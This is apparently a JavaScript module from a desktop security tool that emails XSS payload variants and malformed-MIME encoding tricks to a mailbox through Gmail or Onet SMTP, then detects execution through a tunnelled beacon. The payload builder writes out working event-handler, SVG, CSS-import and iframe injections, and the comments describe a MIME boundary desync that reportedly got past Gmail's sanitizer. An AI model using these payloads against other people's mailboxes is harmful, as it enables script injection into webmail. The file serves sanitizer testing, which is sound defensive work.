(function () {
  // Mail XSS Tester: send yourself an email containing several HTML/XSS
  // payload variants, each proving execution by firing a request to a
  // unique beacon URL - a sanitized/stripped payload never runs, so it
  // never calls out. Every payload's ONLY effect is that beacon request
  // (no exfiltration, no persistence) - this is a sanitization diagnostic
  // for your OWN mailbox, not an attack tool. See src-tauri/src/main.rs's
  // own "Mail XSS Tester" comment block for the Rust side (beacon HTTP
  // listener + tunnel process + SMTP send).
  //
  // Detection needs a PUBLICLY reachable beacon endpoint - webmail
  // providers (Gmail in particular) fetch/proxy embedded images through
  // their own infrastructure, not from the recipient's machine, so a
  // plain localhost listener could never receive the hit. Cloudflare's
  // free, account-free Quick Tunnel bridges that - see startTunnel().

  // Which payloads/techniques are checked and which categories are
  // collapsed - persisted to localStorage (same always-on treatment as
  // mail-verification-runtime.js's verifiedEmails) so re-opening the app
  // doesn't silently reset a picker you'd already set up. Credentials
  // (gmailAddress/appPassword/provider) deliberately stay OUT of this -
  // those keep the RAM-only, never-persisted discipline described below.
  var SELECTION_STORAGE_KEY = "netrecon_mail_xss_tester_selection_v1";

  function loadPersistedSelection() {
    try {
      var raw = window.localStorage ? window.localStorage.getItem(SELECTION_STORAGE_KEY) : "";
      if (!raw) return null;
      var parsed = JSON.parse(raw);
      return parsed && typeof parsed === "object" ? parsed : null;
    } catch (_) {
      return null;
    }
  }

  function savePersistedSelection(data) {
    try {
      if (window.localStorage) window.localStorage.setItem(SELECTION_STORAGE_KEY, JSON.stringify(data));
    } catch (_) {
      // ignore persistence failures
    }
  }

  // SMTP relay providers the send form can pick between - Gmail (the
  // original, only option) and Onet, added so a technique message genuinely
  // crosses TWO real mail systems (our tool -> real Onet SMTP -> internet ->
  // Gmail) instead of only ever originating from our own tool, in case a
  // provider's own relay/rewrite step matters for a technique that a direct
  // send never exercises. Onet's own published settings use the same
  // port-465-implicit-TLS scheme already used for Gmail, so no other Rust
  // change was needed beyond parameterizing the hardcoded host string.
  var MAIL_PROVIDERS = [
    { id: "gmail", host: "smtp.gmail.com", labelKey: "mailXssProviderGmail" },
    { id: "onet", host: "smtp.poczta.onet.pl", labelKey: "mailXssProviderOnet" },
  ];

  var PAYLOADS = [
    { id: "img-onerror", labelKey: "mailXssPayloadImgOnerror", category: "event-handlers" },
    { id: "svg-onload", labelKey: "mailXssPayloadSvgOnload", category: "svg" },
    { id: "svg-script", labelKey: "mailXssPayloadSvgScript", category: "svg" },
    { id: "css-import", labelKey: "mailXssPayloadCssImport", category: "css" },
    { id: "iframe-src", labelKey: "mailXssPayloadIframeSrc", category: "embed" },
    { id: "foreignobject", labelKey: "mailXssPayloadForeignObject", category: "svg" },
  ];

  // Grouping/UI metadata only - getPayloads() below stays exactly what it
  // was (flat, real payloads only, unchanged shape) since that's what
  // actually gets sent/selected. Category order here is the display order
  // in the LS panel (panel-content-runtime.js's renderMailXssTesterLibrary).
  var PAYLOAD_CATEGORIES = [
    { id: "event-handlers", labelKey: "mailXssCategoryEventHandlers" },
    { id: "svg", labelKey: "mailXssCategorySvg" },
    { id: "css", labelKey: "mailXssCategoryCss" },
    { id: "embed", labelKey: "mailXssCategoryEmbed" },
    { id: "mxss", labelKey: "mailXssCategoryMxss" },
    { id: "encoding", labelKey: "mailXssCategoryEncoding" },
    { id: "mime", labelKey: "mailXssCategoryMime" },
    { id: "amp", labelKey: "mailXssCategoryAmp" },
    { id: "smtp-headers", labelKey: "mailXssCategorySmtpHeaders" },
  ];

  // Not implemented yet - shown as disabled/grayed-out checkboxes in their
  // category so the planned coverage is visible, but nothing here is a real
  // payload: no id, never sent, never selectable. mutation XSS and AMP4Email
  // are still on this list; encoding/mime/smtp-headers moved to
  // RAW_TECHNIQUES below once they became real (a pentester's follow-up tip
  // after the first real finding: stop throwing known payloads at Gmail,
  // look at the SMTP/MIME <-> HTML parsing boundary instead).
  var PLACEHOLDER_PAYLOADS = [
    { category: "event-handlers", labelKey: "mailXssPlaceholderRareEventHandlers" },
    { category: "embed", labelKey: "mailXssPlaceholderIframeSrcdoc" },
    { category: "mxss", labelKey: "mailXssPlaceholderMxss" },
    { category: "amp", labelKey: "mailXssPlaceholderAmp" },
  ];

  // Raw-MIME encoding techniques - unlike PAYLOADS above, each of these
  // needs its OWN wholly separate email (a custom charset, a hand-picked
  // MIME boundary, invalid UTF-8 bytes - none of that can share a message
  // with the others or with a normal UTF-8 HTML body), built byte-for-byte
  // in Rust (see main.rs's build_technique_message and its 4 builders) and
  // sent via send_encoding_test_email's send_raw() escape hatch rather than
  // through the plain send_test_email/buildPayloadHtml path above.
  var RAW_TECHNIQUES = [
    { id: "utf7-charset", labelKey: "mailXssTechniqueUtf7Charset", category: "encoding" },
    { id: "overlong-utf8", labelKey: "mailXssTechniqueOverlongUtf8", category: "encoding" },
    // The 6 fixed script/style x soft-break/hex-open/hex-close/hex-both
    // presets and the 10 fixed qp-natural-wrap-N length variants that
    // used to live here were removed once the LS panel's "Custom
    // technique builder" (vector/mechanism/filler-text fields, plus a
    // queue for sending several combos together) could reconstruct every
    // one of them and more - keeping both meant the exact same
    // combination existed as two different UI elements. See
    // build_custom_technique_message in main.rs for the still-current,
    // generic version of what these used to hand-build one at a time.
    { id: "mime-boundary-desync", labelKey: "mailXssTechniqueMimeBoundaryDesync", category: "mime" },
    // Same structural MIME confusion, smuggling <style>@import> instead of
    // <img> - added after the plain <img> variant confirmed real against
    // Gmail but only reached Google's own GoogleImageProxy (ggpht.com), not
    // the recipient's browser directly. External CSS isn't necessarily
    // covered by that same image-proxy layer, so this tests whether the
    // identical desync reaches the recipient unproxied instead.
    { id: "mime-boundary-desync-css", labelKey: "mailXssTechniqueMimeBoundaryDesyncCss", category: "mime" },
    // Control pair for the two desync variants above - byte-for-byte the
    // same 3-part multipart/alternative shape, but every boundary line is
    // well-formed (main.rs's build_mime_alternative_control_message). If
    // these ALSO trigger, the malformed boundary was never doing anything -
    // it's just multipart/alternative's own "render the last part you
    // understand" rule (RFC 2046 §5.1.4), not a parser bug.
    { id: "mime-alternative-control-img", labelKey: "mailXssTechniqueMimeAlternativeControlImg", category: "mime" },
    { id: "mime-alternative-control-css", labelKey: "mailXssTechniqueMimeAlternativeControlCss", category: "mime" },
    { id: "encoded-word-header", labelKey: "mailXssTechniqueEncodedWordHeader", category: "smtp-headers" },
  ];

  // Every variant's payload is "fire a request to beaconUrl" via whichever
  // vector it demonstrates - if a webmail's sanitizer strips the
  // attribute/tag, the fetch/import never happens and the payload simply
  // never reports in, which IS the useful signal (nothing to "clean up"
  // either way, and nothing here does more than call out).
  function buildPayloadHtml(id, beaconUrl) {
    var ping = "fetch('" + beaconUrl + "').catch(function(){})";
    switch (id) {
      case "img-onerror":
        return '<img src="https://invalid.example/x.png" alt="" onerror="' + ping + '" />';
      case "svg-onload":
        return '<svg onload="' + ping + '"></svg>';
      case "svg-script":
        return "<svg><script>" + ping + "</script></svg>";
      case "css-import":
        return '<style>@import "' + beaconUrl + '";</style>';
      case "iframe-src":
        return '<iframe src="' + beaconUrl + '"></iframe>';
      case "foreignobject":
        return '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="' + ping + '"></body></foreignObject></svg>';
      default:
        return "";
    }
  }

  function randomToken(len) {
    var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    var out = "";
    for (var i = 0; i < len; i++) out += chars.charAt(Math.floor(Math.random() * chars.length));
    return out;
  }

  // JS-side mirror of main.rs's build_filler_text() - lets the custom
  // technique builder's "Generate" button preview/seed the filler
  // textarea instantly, client-side, without a round trip to Rust just to
  // see what a given length would look like. The actual send still goes
  // through whatever the user leaves in the textarea (which they're free
  // to edit or replace with pasted text of their own), not this preview.
  function buildFillerPreview(targetLen) {
    var base = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj. ";
    var out = "";
    while (out.length < targetLen) out += base;
    return out.slice(0, targetLen);
  }

  function createMailXssTesterRuntime() {
    var persistedSelection = loadPersistedSelection();
    // Payload ids in persistedSelection are filtered against the CURRENT
    // PAYLOADS/RAW_TECHNIQUES lists (not blindly trusted) - a stored id
    // from a previous app version that no longer exists (a removed/renamed
    // payload) would otherwise silently persist as a phantom "selected"
    // entry forever, with no checkbox left to ever uncheck it from.
    var validPayloadIds = PAYLOADS.map(function (p) { return p.id; });
    var validTechniqueIds = RAW_TECHNIQUES.map(function (t) { return t.id; });
    var selectedIds = (persistedSelection && Array.isArray(persistedSelection.selectedPayloadIds))
      ? persistedSelection.selectedPayloadIds.filter(function (id) { return validPayloadIds.indexOf(id) !== -1; })
      : validPayloadIds.slice();
    var selectedTechniqueIds = (persistedSelection && Array.isArray(persistedSelection.selectedTechniqueIds))
      ? persistedSelection.selectedTechniqueIds.filter(function (id) { return validTechniqueIds.indexOf(id) !== -1; })
      : [];
    // null = no preference ever recorded (first-ever use) - the renderer
    // falls back to its own hasRealItems-based default per category in
    // that case. Once the user touches any category header, this becomes
    // a complete, explicit snapshot of every category's state (see
    // setCollapsedCategoryIds's own comment for why it's saved as a whole
    // array rather than one id at a time).
    var collapsedCategoryIds = (persistedSelection && Array.isArray(persistedSelection.collapsedCategoryIds))
      ? persistedSelection.collapsedCategoryIds.slice()
      : null;

    function persistSelection() {
      savePersistedSelection({
        selectedPayloadIds: selectedIds,
        selectedTechniqueIds: selectedTechniqueIds,
        collapsedCategoryIds: collapsedCategoryIds,
      });
    }

    var tunnelStatus = "idle"; // idle | starting | running | error
    var tunnelUrl = "";
    var tunnelError = "";
    var hits = [];
    var unlistenHits = null;
    // A fresh random token per tunnel session, prefixed onto every beacon
    // path (/hit/<sessionToken>-<payloadId>) - the payload id alone stays
    // human-readable in the results table, but the full path isn't
    // trivially guessable by anyone else who might stumble onto the
    // short-lived public tunnel URL during the test window.
    var sessionToken = "";

    // Draft copies of the Gmail address/app password fields, kept ONLY in
    // memory (never localStorage/session, same "read at use time, never
    // persisted" discipline as sendTestEmail() below) - purely so the LS
    // panel's fields survive switching to a different center tab and back.
    // That panel's markup is fully torn down and regenerated on every such
    // switch (see wireMailXssTesterLibrary in panel-interactions-runtime.js,
    // a plain uncontrolled-input render), which used to silently reset both
    // fields to empty; re-populating them from here on each fresh render
    // fixes that without persisting the app password anywhere durable.
    var draftGmailAddress = "";
    var draftAppPassword = "";
    var draftProvider = MAIL_PROVIDERS[0].id;
    // Same reasoning, same fix, for the custom technique builder's own
    // fields - confirmed missing via a real reproduction (typed a char
    // count, switched LS tabs away and back, found it reset to the
    // hardcoded default of 50 and the mechanism back to "soft-break").
    var draftCustomVector = "script";
    var draftCustomMechanism = "soft-break";
    // draftCustomFillerLength only seeds the "Generate" button's preview
    // (buildFillerPreview above) - draftCustomFillerText is the actual
    // content that gets sent, freely editable/pasteable after that.
    var draftCustomFillerLength = 50;
    var draftCustomFillerText = buildFillerPreview(50);

    function emitChanged() {
      try {
        document.dispatchEvent(new CustomEvent("newui:mail-xss-tester-changed", {
          detail: { tunnelStatus: tunnelStatus, tunnelUrl: tunnelUrl, tunnelError: tunnelError, hits: hits.slice() }
        }));
      } catch (_) {
        // ignore event dispatch failures
      }
    }

    function getPayloads() {
      return PAYLOADS.slice();
    }

    function getPayloadCategories() {
      return PAYLOAD_CATEGORIES.slice();
    }

    function getPlaceholderPayloads() {
      return PLACEHOLDER_PAYLOADS.slice();
    }

    function getSelectedPayloadIds() {
      return selectedIds.slice();
    }

    function setPayloadSelected(id, selected) {
      var idx = selectedIds.indexOf(id);
      if (selected && idx === -1) selectedIds.push(id);
      else if (!selected && idx !== -1) selectedIds.splice(idx, 1);
      persistSelection();
      emitChanged();
    }

    function getRawTechniques() {
      return RAW_TECHNIQUES.slice();
    }

    function getSelectedTechniqueIds() {
      return selectedTechniqueIds.slice();
    }

    // Deliberately starts empty (unlike selectedIds above, which defaults
    // to "everything") - these are exploratory, unproven techniques rather
    // than known-safe diagnostics, so sending one is always an explicit
    // opt-in rather than something that fires just by having the panel open.
    function setTechniqueSelected(id, selected) {
      var idx = selectedTechniqueIds.indexOf(id);
      if (selected && idx === -1) selectedTechniqueIds.push(id);
      else if (!selected && idx !== -1) selectedTechniqueIds.splice(idx, 1);
      persistSelection();
      emitChanged();
    }

    // null means "no preference recorded yet" (see the module-level
    // collapsedCategoryIds comment above) - returned as-is (not .slice()'d
    // to []) so callers can tell "nothing customized" apart from
    // "customized to nothing collapsed".
    function getCollapsedCategoryIds() {
      return collapsedCategoryIds === null ? null : collapsedCategoryIds.slice();
    }

    // Takes the FULL current set of collapsed category ids, not one id at
    // a time - called from panel-interactions-runtime.js right after any
    // category header toggle, reading every [data-mail-xss-category]
    // element's live class list at that moment. A whole-snapshot write
    // avoids ever having to represent "explicitly expanded" vs "never
    // touched, following the default" with the same "absent from the
    // list" value once any single category has been customized.
    function setCollapsedCategoryIds(ids) {
      collapsedCategoryIds = Array.isArray(ids) ? ids.slice() : [];
      persistSelection();
      // No emitChanged() - this only records what the generic .v1-section-
      // header click handler (bootstrap-runtime.js) already did to the
      // DOM; nothing needs to re-render because of it.
    }

    function getTunnelStatus() { return tunnelStatus; }
    function getTunnelUrl() { return tunnelUrl; }
    function getTunnelError() { return tunnelError; }
    function getHits() { return hits.slice(); }

    // Deliberately no emitChanged() here - these fire on every keystroke,
    // and re-rendering the whole panel per keystroke would fight the
    // caret/selection in the very field being typed into. The draft only
    // needs to be picked up on the panel's own next natural re-render.
    function getDraftGmailAddress() { return draftGmailAddress; }
    function setDraftGmailAddress(value) { draftGmailAddress = String(value || ""); }
    function getDraftAppPassword() { return draftAppPassword; }
    function setDraftAppPassword(value) { draftAppPassword = String(value || ""); }
    function getMailProviders() { return MAIL_PROVIDERS.slice(); }
    function getDraftProvider() { return draftProvider; }
    function setDraftProvider(value) {
      var match = MAIL_PROVIDERS.some(function (p) { return p.id === value; });
      draftProvider = match ? value : MAIL_PROVIDERS[0].id;
    }
    function getProviderHost(providerId) {
      var found = MAIL_PROVIDERS.filter(function (p) { return p.id === providerId; })[0];
      return found ? found.host : MAIL_PROVIDERS[0].host;
    }
    function getDraftCustomVector() { return draftCustomVector; }
    function setDraftCustomVector(value) { draftCustomVector = value === "style" ? "style" : "script"; }
    function getDraftCustomMechanism() { return draftCustomMechanism; }
    function setDraftCustomMechanism(value) {
      var valid = ["soft-break", "hex-open", "hex-close", "hex-both", "natural-wrap"];
      draftCustomMechanism = valid.indexOf(value) !== -1 ? value : "soft-break";
    }
    function getDraftCustomFillerLength() { return draftCustomFillerLength; }
    function setDraftCustomFillerLength(value) {
      var n = parseInt(value, 10);
      draftCustomFillerLength = (n && n > 0) ? Math.min(n, 2000) : 50;
    }
    function getDraftCustomFillerText() { return draftCustomFillerText; }
    function setDraftCustomFillerText(value) { draftCustomFillerText = String(value || ""); }
    function generateCustomFillerPreview(len) { return buildFillerPreview(len); }

    // Strips the per-session random prefix back off a hit's payload_id
    // (see the sessionToken comment above) so callers only ever deal in
    // plain payload ids, never the "<token>-<id>" wire format - kept here
    // rather than leaked into the renderer, since sessionToken is this
    // module's own private state.
    function getTriggeredPayloadIds() {
      var prefix = sessionToken + "-";
      var triggered = {};
      hits.forEach(function (h) {
        var pid = (h && h.payload_id) || "";
        if (pid.indexOf(prefix) === 0) triggered[pid.slice(prefix.length)] = true;
      });
      return Object.keys(triggered);
    }

    function ensureHitListener() {
      if (unlistenHits) return;
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform || typeof platform.listen !== "function") return;
      Promise.resolve(platform.listen("mail-xss-beacon-hit", function (hit) {
        if (!hit) return;
        hits.push(hit);
        emitChanged();
      })).then(function (unlistenFn) {
        unlistenHits = unlistenFn;
      });
    }

    function startTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      tunnelStatus = "starting";
      tunnelError = "";
      hits = [];
      sessionToken = randomToken(16);
      ensureHitListener();
      emitChanged();

      Promise.resolve(platform.invoke("start_beacon_server", {})).then(function (port) {
        return platform.invoke("start_tunnel", { method: "cloudflare", localPort: port });
      }).then(function (url) {
        tunnelUrl = url;
        tunnelStatus = "running";
        emitChanged();
      }).catch(function (err) {
        tunnelStatus = "error";
        tunnelError = (err && err.message) ? err.message : String(err);
        // The beacon listener may have started even if the tunnel step
        // failed (e.g. cloudflared missing) - stop it too, no orphaned
        // local listener left behind after a failed start.
        Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
        emitChanged();
      });
    }

    function stopTunnel() {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return;
      Promise.resolve(platform.invoke("stop_tunnel", {})).catch(function () {});
      Promise.resolve(platform.invoke("stop_beacon_server", {})).catch(function () {});
      tunnelStatus = "idle";
      tunnelUrl = "";
      tunnelError = "";
      emitChanged();
    }

    function buildEmailHtml() {
      var payloadsById = {};
      PAYLOADS.forEach(function (p) { payloadsById[p.id] = p; });
      return getSelectedPayloadIds().map(function (id) {
        var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + id;
        return "<p>" + id + "</p>" + buildPayloadHtml(id, beaconUrl);
      }).join("\n<hr/>\n");
    }

    // Credentials (gmailAddress doubles as the SMTP username, appPassword)
    // are read straight from opts at call time and forwarded directly to
    // the Rust command - never stored on this module or anywhere else,
    // same one-time, read-at-use-only discipline as the remote-install/RDP
    // password fields built earlier.
    function sendTestEmail(opts) {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.reject(new Error("platform unavailable"));
      if (tunnelStatus !== "running") return Promise.reject(new Error("tunnel not running"));
      return platform.invoke("send_test_email", {
        gmailAddress: opts.gmailAddress,
        appPassword: opts.appPassword,
        to: opts.to,
        subject: opts.subject,
        htmlBody: buildEmailHtml(),
        smtpHost: getProviderHost(opts.provider),
      });
    }

    // Each selected raw technique is its OWN separate email (see
    // RAW_TECHNIQUES's comment - none of these can share a message with
    // each other or with the normal payloads' combined body), sent one at a
    // time through the same SMTP credentials rather than in parallel, so a
    // slow/failing send doesn't race the next one on the same account.
    // Resolves with {sent, failed} instead of rejecting on the first error,
    // so one bad technique doesn't stop the rest from being tried.
    function sendEncodingTestEmails(opts) {
      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.reject(new Error("platform unavailable"));
      if (tunnelStatus !== "running") return Promise.reject(new Error("tunnel not running"));

      var ids = getSelectedTechniqueIds();
      var sent = [];
      var failed = [];

      return ids.reduce(function (chain, id) {
        return chain.then(function () {
          var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + id;
          return platform.invoke("send_encoding_test_email", {
            gmailAddress: opts.gmailAddress,
            appPassword: opts.appPassword,
            to: opts.to,
            subject: opts.subject + " [" + id + "]",
            beaconUrl: beaconUrl,
            technique: id,
            smtpHost: getProviderHost(opts.provider),
          }).then(function () {
            sent.push(id);
          }).catch(function (err) {
            failed.push({ id: id, message: (err && err.message) ? err.message : String(err) });
          });
        });
      }, Promise.resolve()).then(function () {
        return { sent: sent, failed: failed };
      });
    }

    // Whether a send is currently in flight, and the last completed send's
    // outcome - kept HERE (the one singleton runtime instance,
    // window.NetReconNewUICore.mailXssTester, created once at script load)
    // rather than as a closure variable inside panel-interactions-runtime.js's
    // wireMailXssTesterLibrary(), because that function re-runs with a
    // completely FRESH closure every time Mail XSS Tester's LS panel gets
    // torn down and rebuilt - which happens on every switch away to a
    // different LS tool and back (activateGenericContent() in
    // navigation-runtime.js always creates a brand new mount element for
    // non-"move" tools). A closure-local isSending flag reset itself to
    // false on such a switch even while a batch send was still genuinely
    // running in the background, silently re-enabling "Send" in the fresh
    // instance and letting a second click actually re-send every selected
    // technique a second time - confirmed via a real reproduction (2
    // techniques sent, tab switched away and back mid-send, "Send" clicked
    // again -> 4 real send_encoding_test_email calls). Tracking it here
    // instead means EVERY render, from ANY mount instance, reads the same
    // true state.
    var isSending = false;
    // Which send is in flight - both sendAll() and sendCustomTechnique()
    // share the isSending re-entrancy guard (never run two SMTP sends on
    // the same mailbox at once), but keep SEPARATE result slots so a
    // custom-technique send's outcome only ever shows in the custom
    // builder's own result area, never overwriting the main form's.
    var activeSendKind = null; // null | "batch" | "custom"
    var lastSendResult = null; // null | {ok:true, techniqueResult} | {ok:false, error}
    var lastCustomSendResult = null; // same shape, from sendCustomTechnique()

    function getIsSending() { return isSending; }
    function getActiveSendKind() { return activeSendKind; }
    function getLastSendResult() { return lastSendResult; }
    function getLastCustomSendResult() { return lastCustomSendResult; }

    // Owns the hasPayloads/hasTechniques branching and sequencing
    // (sendTestEmail then sendEncodingTestEmails) that used to live
    // directly in panel-interactions-runtime.js's submit handler - moved
    // here so isSending/lastSendResult can be updated atomically around
    // the whole batch regardless of which UI instance triggered it.
    // Resolves, never rejects: {started:false, reason:"already-sending"}
    // if a batch is already running (re-entrancy guard, now correct
    // regardless of DOM churn), {started:false, reason:"nothing-selected"}
    // if neither a payload nor a technique is checked, or
    // {started:true, ok, techniqueResult|error} once the batch completes.
    function sendAll(opts) {
      if (isSending) return Promise.resolve({ started: false, reason: "already-sending" });

      var hasPayloads = getSelectedPayloadIds().length > 0;
      var hasTechniques = getSelectedTechniqueIds().length > 0;
      if (!hasPayloads && !hasTechniques) {
        return Promise.resolve({ started: false, reason: "nothing-selected" });
      }

      isSending = true;
      activeSendKind = "batch";
      emitChanged();

      var normalSendPromise = hasPayloads ? sendTestEmail(opts) : Promise.resolve();
      return normalSendPromise.then(function () {
        return hasTechniques ? sendEncodingTestEmails(opts) : null;
      }).then(function (techniqueResult) {
        lastSendResult = { ok: true, techniqueResult: techniqueResult };
        return { started: true, ok: true, techniqueResult: techniqueResult };
      }).catch(function (err) {
        var message = (err && err.message) ? err.message : String(err);
        lastSendResult = { ok: false, error: message };
        return { started: true, ok: false, error: message };
      }).then(function (result) {
        isSending = false;
        activeSendKind = null;
        emitChanged();
        return result;
      });
    }

    // "Custom technique builder" (LS panel) - one send_custom_technique_email
    // call combining opts.vector ("script"/"style") with opts.mechanism
    // ("soft-break"/"hex-open"/"hex-close"/"hex-both"/"natural-wrap", the
    // last needing opts.fillerText - the actual filler CONTENT, shown/
    // editable/pasteable in a textarea, not just a length) instead of a
    // fixed, hardcoded technique id. Shares isSending/lastSendResult with
    // sendAll() above (same re-entrancy guard, same singleton-survives-
    // DOM-churn reasoning) so a custom send and a batch send can't
    // accidentally run at once.
    function sendCustomTechnique(opts) {
      if (isSending) return Promise.resolve({ started: false, reason: "already-sending" });

      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.resolve({ started: false, reason: "platform-unavailable" });
      if (tunnelStatus !== "running") return Promise.resolve({ started: false, reason: "tunnel-not-running" });

      isSending = true;
      activeSendKind = "custom";
      emitChanged();

      // Identifies the send in the beacon path/hit log without embedding
      // the (potentially long, free-typed) filler text itself - a short
      // hash of it is enough to tell two otherwise-identical sends apart.
      var techniqueId = "custom-" + opts.vector + "-" + opts.mechanism +
        (opts.mechanism === "natural-wrap" ? "-" + String((opts.fillerText || "").length) : "");
      var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + techniqueId;

      return Promise.resolve(platform.invoke("send_custom_technique_email", {
        gmailAddress: opts.gmailAddress,
        appPassword: opts.appPassword,
        to: opts.to,
        subject: opts.subject,
        beaconUrl: beaconUrl,
        vector: opts.vector,
        mechanism: opts.mechanism,
        fillerText: opts.fillerText,
        smtpHost: getProviderHost(opts.provider),
      })).then(function () {
        lastCustomSendResult = { ok: true };
        return { started: true, ok: true };
      }).catch(function (err) {
        var message = (err && err.message) ? err.message : String(err);
        lastCustomSendResult = { ok: false, error: message };
        return { started: true, ok: false, error: message };
      }).then(function (result) {
        isSending = false;
        activeSendKind = null;
        emitChanged();
        return result;
      });
    }

    // Custom technique QUEUE - a "+" button (LS panel) appends the
    // current vector/mechanism/fillerText combo here instead of sending
    // it immediately, so several hand-built combinations (e.g. a whole
    // sweep of natural-wrap filler texts of your own choosing, replacing
    // what used to need 10 separate hardcoded qp-natural-wrap-N
    // checkboxes) can be reviewed and sent together in one batch -
    // sendCustomTechnique above stays for the immediate single-combo
    // send, unrelated to this list. Kept in the singleton runtime (not a
    // panel-interactions-runtime.js closure) for the same "survives LS
    // panel teardown/rebuild" reason as isSending/every draft above.
    var customQueue = [];

    function getCustomQueue() { return customQueue.slice(); }

    function addToCustomQueue(entry) {
      // Every mechanism except natural-wrap ignores fillerText entirely
      // (build_custom_technique_message in main.rs only reads it inside
      // the "natural-wrap" match arm) - normalized to "" here rather than
      // storing whatever happened to be left in the textarea, so a queued
      // soft-break/hex-* entry's own summary line never shows filler text
      // that has no actual effect on what gets sent.
      var mechanism = entry.mechanism;
      customQueue.push({
        id: randomToken(8),
        vector: entry.vector === "style" ? "style" : "script",
        mechanism: mechanism,
        fillerText: mechanism === "natural-wrap" ? String(entry.fillerText || "") : "",
      });
      emitChanged();
    }

    function removeFromCustomQueue(id) {
      customQueue = customQueue.filter(function (e) { return e.id !== id; });
      emitChanged();
    }

    // Sequential, same reasoning as sendEncodingTestEmails (one bad entry
    // shouldn't stop the rest) - shares isSending/activeSendKind="custom"
    // with sendCustomTechnique/sendAll, so this can't overlap with either.
    // Resolves {sent, failed} into lastCustomSendResult via the SAME
    // {ok, techniqueResult} shape sendAll already uses, so
    // panel-interactions-runtime.js's existing resultMessageFor() renders
    // it identically (success/partial-failure wording) with no new code.
    function sendCustomQueue(opts) {
      if (isSending) return Promise.resolve({ started: false, reason: "already-sending" });
      if (customQueue.length === 0) return Promise.resolve({ started: false, reason: "queue-empty" });

      var platform = window.NetReconNewUICore && window.NetReconNewUICore.platform;
      if (!platform) return Promise.resolve({ started: false, reason: "platform-unavailable" });
      if (tunnelStatus !== "running") return Promise.resolve({ started: false, reason: "tunnel-not-running" });

      isSending = true;
      activeSendKind = "custom";
      emitChanged();

      var queueSnapshot = customQueue.slice();
      var sent = [];
      var failed = [];

      return queueSnapshot.reduce(function (chain, entry) {
        return chain.then(function () {
          var techniqueId = "custom-" + entry.vector + "-" + entry.mechanism + "-" + entry.id;
          var beaconUrl = tunnelUrl + "/hit/" + sessionToken + "-" + techniqueId;
          return Promise.resolve(platform.invoke("send_custom_technique_email", {
            gmailAddress: opts.gmailAddress,
            appPassword: opts.appPassword,
            to: opts.to,
            subject: opts.subject,
            beaconUrl: beaconUrl,
            vector: entry.vector,
            mechanism: entry.mechanism,
            fillerText: entry.fillerText,
            smtpHost: getProviderHost(opts.provider),
          })).then(function () {
            sent.push(entry.id);
          }).catch(function (err) {
            failed.push({ id: entry.id, message: (err && err.message) ? err.message : String(err) });
          });
        });
      }, Promise.resolve()).then(function () {
        var techniqueResult = { sent: sent, failed: failed };
        lastCustomSendResult = { ok: true, techniqueResult: techniqueResult };
        isSending = false;
        activeSendKind = null;
        emitChanged();
        return { started: true, ok: true, techniqueResult: techniqueResult };
      });
    }

    return {
      getPayloads: getPayloads,
      getPayloadCategories: getPayloadCategories,
      getPlaceholderPayloads: getPlaceholderPayloads,
      getSelectedPayloadIds: getSelectedPayloadIds,
      setPayloadSelected: setPayloadSelected,
      getRawTechniques: getRawTechniques,
      getSelectedTechniqueIds: getSelectedTechniqueIds,
      setTechniqueSelected: setTechniqueSelected,
      getCollapsedCategoryIds: getCollapsedCategoryIds,
      setCollapsedCategoryIds: setCollapsedCategoryIds,
      getTunnelStatus: getTunnelStatus,
      getTunnelUrl: getTunnelUrl,
      getTunnelError: getTunnelError,
      getDraftGmailAddress: getDraftGmailAddress,
      setDraftGmailAddress: setDraftGmailAddress,
      getDraftAppPassword: getDraftAppPassword,
      setDraftAppPassword: setDraftAppPassword,
      getMailProviders: getMailProviders,
      getDraftProvider: getDraftProvider,
      setDraftProvider: setDraftProvider,
      getProviderHost: getProviderHost,
      getDraftCustomVector: getDraftCustomVector,
      setDraftCustomVector: setDraftCustomVector,
      getDraftCustomMechanism: getDraftCustomMechanism,
      setDraftCustomMechanism: setDraftCustomMechanism,
      getDraftCustomFillerLength: getDraftCustomFillerLength,
      setDraftCustomFillerLength: setDraftCustomFillerLength,
      getDraftCustomFillerText: getDraftCustomFillerText,
      setDraftCustomFillerText: setDraftCustomFillerText,
      generateCustomFillerPreview: generateCustomFillerPreview,
      startTunnel: startTunnel,
      stopTunnel: stopTunnel,
      getHits: getHits,
      getTriggeredPayloadIds: getTriggeredPayloadIds,
      sendTestEmail: sendTestEmail,
      sendEncodingTestEmails: sendEncodingTestEmails,
      getIsSending: getIsSending,
      getActiveSendKind: getActiveSendKind,
      getLastSendResult: getLastSendResult,
      getLastCustomSendResult: getLastCustomSendResult,
      sendAll: sendAll,
      sendCustomTechnique: sendCustomTechnique,
      getCustomQueue: getCustomQueue,
      addToCustomQueue: addToCustomQueue,
      removeFromCustomQueue: removeFromCustomQueue,
      sendCustomQueue: sendCustomQueue,
      // localStorage-only otherwise (persistSelection above), bundled into
      // the session file too per the same "carry it to another machine/
      // profile" treatment as domainVerification/mailVerification.
      getStateForSession: function () {
        return {
          selectedPayloadIds: selectedIds.slice(),
          selectedTechniqueIds: selectedTechniqueIds.slice(),
          collapsedCategoryIds: collapsedCategoryIds === null ? null : collapsedCategoryIds.slice(),
        };
      },
      restoreFromSession: function (data) {
        data = data || {};
        selectedIds = Array.isArray(data.selectedPayloadIds)
          ? data.selectedPayloadIds.filter(function (id) { return validPayloadIds.indexOf(id) !== -1; })
          : [];
        selectedTechniqueIds = Array.isArray(data.selectedTechniqueIds)
          ? data.selectedTechniqueIds.filter(function (id) { return validTechniqueIds.indexOf(id) !== -1; })
          : [];
        collapsedCategoryIds = Array.isArray(data.collapsedCategoryIds) ? data.collapsedCategoryIds.slice() : null;
        persistSelection();
        emitChanged();
      },
    };
  }

